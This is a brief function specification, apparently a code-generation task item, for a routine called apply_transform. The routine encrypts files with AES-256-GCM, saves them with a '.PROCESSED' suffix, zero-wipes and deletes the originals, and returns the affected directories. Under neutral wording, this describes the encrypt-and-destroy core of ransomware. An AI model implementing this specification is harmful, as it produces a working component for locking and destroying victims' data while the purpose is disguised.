description: For each file path and the 32-byte AES session key (const uint8_t*), generates a 12-byte nonce using RAND_bytes(), transforms the file using AES-256-GCM via EVP_CIPHER_CTX from libcrypto, producing output format [12 bytes nonce][ciphertext][16 bytes GCM tag]. Writes transformed object to new file with original name concatenated with suffix .PROCESSED. Overwrites source file with zeros prior to deletion using remove(). Returns list of directory paths where at least one file was transformed.
name: apply_transform
